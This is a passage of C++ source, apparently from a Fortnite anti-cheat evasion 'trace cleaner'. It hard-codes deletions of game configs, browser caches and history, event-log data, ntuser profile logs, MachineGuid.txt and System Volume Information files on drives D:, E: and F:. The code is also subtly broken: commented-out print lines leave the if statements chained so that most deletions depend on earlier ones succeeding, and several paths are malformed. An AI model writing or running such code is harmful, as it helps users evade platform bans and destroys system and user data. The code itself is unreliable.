		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
			//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav" << endl;

			if (DeleteFileW(L"D:\\Users\\Public\\Libraries\\collection.dat") != 0)
				//cout << "Deleted D:\\Users\\Public\\Libraries\\collection.dat" << endl;

				if (DeleteFileW(L"D:\\Users\\Public\\Shared Files:VersionCache") != 0)
					//cout << "Deleted D:\\Users\\Public\\Shared Files:VersionCache" << endl;
					DeleteFileW(L"D:\\Users\\Public\\Shared Files");


	if (DeleteFileW(L"D:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
		//cout << "Deleted D:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat" << endl;

		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\0021346.tmp)").c_str()) != 0)
			//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Temp\\0021346.tmp" << endl;

			if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
				//cout << "Deleted D:\\Users\\Gaypple\\Videos\\Captures\\desktop.ini" << endl;

				if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
					//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Feeds:KnownSources" << endl;


					if (DeleteFileW(L"D:\\desktop.ini:CachedTiles") != 0)
						//cout << "Deleted D:\\desktop.ini:CachedTiles" << endl;

						if (DeleteFileW(L"D:\\Recovery\\ntuser.sys") != 0)
							//cout << "Deleted D:\\Recovery\\ntuser.sys" << endl;


							DeleteFileW(L"D:\\desktop.ini");

	if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat" << endl;


		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Packages\\Settings\\settings.dat" << endl;


			if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)

				//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini" << endl;


				if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient\\GameUserSettings.ini" << endl;



					if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						//cout << "Deleted D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json" << endl;


						if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved)").c_str()) != 0)
							//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\ClientSettings.Sav" << endl;



							if (DeleteFileW(L"D:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								//cout << "Deleted D:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat" << endl;


								if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini" << endl;


									if (DeleteFileW(L"D:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										//cout << "Deleted D:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\ActivationStore.dat" << endl;



										if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Logs\\FortniteGame.log" << endl;

											if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5" << endl;

												if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5" << endl;

													if (DeleteFileW(L"D:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx") != 0)
														//cout << "Deleted D:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx" << endl;


														if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log)").c_str()) != 0)
															//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log" << endl;

															if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log)").c_str()) != 0)
																//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log" << endl;

																if (DeleteFileW(L"D:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2") != 0)
																	//cout << "Deleted D:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2" << endl;

																	if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																		//cout << "Deleted D:\\Users\\Gaypple\\ntuser.ini" << endl;

																		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(ntuser.pol)").c_str()) != 0)
																			//cout << "Deleted D:\\Users\\Gaypple\\ntuser.pol" << endl;

																			if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG1)").c_str()) != 0)
																				//cout << "Deleted D:\\Users\\Gaypple\\ntuser.dat.LOG1" << endl;
																				if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG2)").c_str()) != 0)
																					//cout << "Deleted D:\\Users\\Gaypple\\ntuser.dat.LOG2" << endl;

																					if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat)").c_str()) != 0)
																						//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat" << endl;

																						if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
																							//cout << "Deleted D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache" << endl;

																							if (DeleteFileW(L"D:\\Users\\Public\\Documents") != 0)
																								//cout << "Deleted D:\\Users\\Public\\Documents" << endl;

																								if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
																									//cout << "Deleted D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin" << endl;

																									if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
																										//cout << "Deleted D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\CurveEditorTools\\AssetRegistry.bin" << endl;

																										if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																											//cout << "Deleted D:\\Users\\Gaypple\\Documents\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

																											if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																												//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

																												if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
																													//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\ClientSettings.Sav" << endl;

																													if (DeleteFileW(L"D:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
																														//cout << "Deleted D:\\Windows\\System32\\restore\\MachineGuid.txt" << endl;

																														if (DeleteFileW(L"D:\\System Volume Information\\tracking.log") != 0)
																															//cout << "Deleted D:\\System Volume Information\\tracking.log" << endl;

																															if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																																//cout << "Deleted D:\\Users\\Gaypple\\ntuser.ini" << endl;
																																if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																																	//cout << "Deleted D:\\Users\\Gaypple\\ntuser.pol" << endl;

																																	if (DeleteFileW(L"D:\\PerfLogs\\collection.dat") != 0)
																																		//cout << "Deleted D:\\PerfLogs\\collection.dat" << endl;

																																		if (DeleteFileW(L"D:\\Drivers\\storage.cache") != 0)
																																			//cout << "Deleted D:\\Drivers\\storage.cache" << endl;

																																			if (DeleteFileW(L"D:\\Intel\\setup.cache") != 0)
																																				//cout << "Deleted D:\\Intel\\setup.cache" << endl;

																																				if (DeleteFileW(L"D:\\MSOCache\\Setup.dat") != 0)
																																					//cout << "Deleted D:\\MSOCache\\Setup.dat" << endl;


																																				//Disk E:

																																					if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str()) != 0)
																																						//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\History\\desktop.ini" << endl;

																																						if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
																																							//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav" << endl;

																																							if (DeleteFileW(L"E:\\Users\\Public\\Libraries\\collection.dat") != 0)
																																								//cout << "Deleted E:\\Users\\Public\\Libraries\\collection.dat" << endl;

																																								if (DeleteFileW(L"E:\\Users\\Public\\Shared Files:VersionCache") != 0)
																																									//cout << "Deleted E:\\Users\\Public\\Shared Files:VersionCache" << endl;


																																									if (DeleteFileW(L"E:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
																																										//cout << "Deleted E:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat" << endl;

																																										if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\0021346.tmp)").c_str()) != 0)
																																											//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Temp\\0021346.tmp" << endl;

																																											if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
																																												//cout << "Deleted E:\\Users\\Gaypple\\Videos\\Captures\\desktop.ini" << endl;

																																												if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
																																													//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Feeds:KnownSources" << endl;


																																													if (DeleteFileW(L"E:\\desktop.ini:CachedTiles") != 0)
																																														//cout << "Deleted E:\\desktop.ini:CachedTiles" << endl;

																																														if (DeleteFileW(L"E:\\Recovery\\ntuser.sys") != 0)
																																															//cout << "Deleted E:\\Recovery\\ntuser.sys" << endl;


																																															DeleteFileW(L"E:\\desktop.ini");

	if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat" << endl;


		if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Packages\\Settings\\settings.dat" << endl;


			if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)

				//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini" << endl;


				if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient\\GameUserSettings.ini" << endl;



					if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						//cout << "Deleted E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json" << endl;


						if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved)").c_str()) != 0)
							//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\ClientSettings.Sav" << endl;



							if (DeleteFileW(L"E:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								//cout << "Deleted E:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat" << endl;


								if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini" << endl;


									if (DeleteFileW(L"E:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										//cout << "Deleted E:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\ActivationStore.dat" << endl;



										if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Logs\\FortniteGame.log" << endl;

											if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5" << endl;

												if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5" << endl;

													if (DeleteFileW(L"E:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx") != 0)
														//cout << "Deleted E:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx" << endl;


														if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log)").c_str()) != 0)
															//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log" << endl;

															if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log)").c_str()) != 0)
																//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log" << endl;

																if (DeleteFileW(L"E:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2") != 0)
																	//cout << "Deleted E:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2" << endl;

																	if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																		//cout << "Deleted E:\\Users\\Gaypple\\ntuser.ini" << endl;
																		if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(ntuser.pol)").c_str()) != 0)
																			//cout << "Deleted E:\\Users\\Gaypple\\ntuser.pol" << endl;



																			if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG1)").c_str()) != 0)
																				//cout << "Deleted E:\\Users\\Gaypple\\ntuser.dat.LOG1" << endl;
																				if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG2)").c_str()) != 0)
																					//cout << "Deleted E:\\Users\\Gaypple\\ntuser.dat.LOG2" << endl;

																					if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat)").c_str()) != 0)
																						//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat" << endl;

																						if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
																							//cout << "Deleted E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache" << endl;

																							if (DeleteFileW(L"E:\\Users\\Public\\Documents") != 0)
																								//cout << "Deleted E:\\Users\\Public\\Documents" << endl;

																								if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
																									//cout << "Deleted E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin" << endl;

																									if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
																										//cout << "Deleted E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\CurveEditorTools\\AssetRegistry.bin" << endl;

																										if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																											//cout << "Deleted E:\\Users\\Gaypple\\Documents\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

																											if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																												//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

																												if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
																													//cout << "Deleted E:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\ClientSettings.Sav" << endl;

																													if (DeleteFileW(L"E:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
																														//cout << "Deleted E:\\Windows\\System32\\restore\\MachineGuid.txt" << endl;

																														if (DeleteFileW(L"E:\\System Volume Information\\tracking.log") != 0)
																															//cout << "Deleted E:\\System Volume Information\\tracking.log" << endl;

																															if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																																//cout << "Deleted E:\\Users\\Gaypple\\ntuser.ini" << endl;
																																if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																																	//cout << "Deleted E:\\Users\\Gaypple\\ntuser.pol" << endl;

																																	if (DeleteFileW(L"E:\\PerfLogs\\collection.dat") != 0)
																																		//cout << "Deleted E:\\PerfLogs\\collection.dat" << endl;

																																		if (DeleteFileW(L"E:\\Drivers\\storage.cache") != 0)
																																			//cout << "Deleted E:\\Drivers\\storage.cache" << endl;

																																			if (DeleteFileW(L"E:\\Intel\\setup.cache") != 0)
																																				//cout << "Deleted E:\\Intel\\setup.cache" << endl;

																																				if (DeleteFileW(L"E:\\MSOCache\\Setup.dat") != 0)
																																					//cout << "Deleted E:\\MSOCache\\Setup.dat" << endl;


																																				//Disk F:

																																					if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str()) != 0)
																																						//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\History\\desktop.ini" << endl;

																																						if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
																																							//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav" << endl;

																																							if (DeleteFileW(L"F:\\Users\\Public\\Libraries\\collection.dat") != 0)
																																								//cout << "Deleted F:\\Users\\Public\\Libraries\\collection.dat" << endl;

																																								if (DeleteFileW(L"F:\\Users\\Public\\Shared Files:VersionCache") != 0)
																																									//cout << "Deleted F:\\Users\\Public\\Shared Files:VersionCache" << endl;


																																									if (DeleteFileW(L"F:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
																																										//cout << "Deleted F:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat" << endl;

																																										if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\0021346.tmp)").c_str()) != 0)
																																											//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Temp\\0021346.tmp" << endl;

																																											if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
																																												//cout << "Deleted F:\\Users\\Gaypple\\Videos\\Captures\\desktop.ini" << endl;

																																												if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
																																													//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Feeds:KnownSources" << endl;


																																													if (DeleteFileW(L"F:\\desktop.ini:CachedTiles") != 0)
																																														//cout << "Deleted F:\\desktop.ini:CachedTiles" << endl;

																																														if (DeleteFileW(L"F:\\Recovery\\ntuser.sys") != 0)
																																															//cout << "Deleted F:\\Recovery\\ntuser.sys" << endl;


																																															DeleteFileW(L"F:\\desktop.ini");

	if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat" << endl;


		if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Packages\\Settings\\settings.dat" << endl;


			if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)

				//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini" << endl;


				if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient\\GameUserSettings.ini" << endl;



					if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						//cout << "Deleted F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json" << endl;


						if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved)").c_str()) != 0)
							//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\ClientSettings.Sav" << endl;



							if (DeleteFileW(L"F:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								//cout << "Deleted F:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat" << endl;


								if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini" << endl;


									if (DeleteFileW(L"F:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										//cout << "Deleted F:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\ActivationStore.dat" << endl;



										if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Logs\\FortniteGame.log" << endl;

											if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5" << endl;

												if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5" << endl;

													if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
														//cout << "Deleted C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache" << endl;

														if (DeleteFileW(L"F:\\Users\\Public\\Documents") != 0)
															//cout << "Deleted C:\\Users\\Public\\Documents" << endl;

															if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																//cout << "Deleted F:\\Users\\Gaypple\\ntuser.ini" << endl;

																if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(ntuser.pol)").c_str()) != 0)
																	//cout << "Deleted F:\\Users\\Gaypple\\ntuser.pol" << endl;

																	if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
																		//cout << "Deleted F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin" << endl;

																		if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
																			//cout << "Deleted F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\CurveEditorTools\\AssetRegistry.bin" << endl;

																			if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
